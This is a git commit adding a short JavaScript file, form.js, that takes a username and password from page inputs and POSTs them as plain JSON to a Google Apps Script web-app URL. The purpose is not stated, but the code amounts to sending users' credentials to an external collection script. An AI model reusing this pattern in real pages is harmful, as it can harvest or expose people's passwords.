cd8264f01dbe369ede18762e1524b637987bdfbf
ScProject-Lab <spdev.3141@gmail.com>
2025-08-03 18:38:33 +0900

    js追加

---
+++ page/js/form.js
@@ -0,0 +1,25 @@
+const usersend = document.getElementById("input-user");
+const passsend = document.getElementById("input-pass");
+
+function inputsend() {
+    fetch("https://script.google.com/macros/s/AKfycbxcM1lytERc9yneZUSAqPannItn20uMxwfUm1vNsquDbpTx1uLDQpUOzrq1XKNdnTHA/exec", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            user: usersend.value,     // .value を使って文字列を取得
+            pass: passsend.value
+        })
+    })
+
+    .then(res => res.text())
+    .then(data => {
+        console.log("GASの返事:", data);
+        alert("送信成功！");
+    })
+    .catch(err => {
+        console.error("エラー:", err);
+        alert("送信失敗！");
+    });
+}
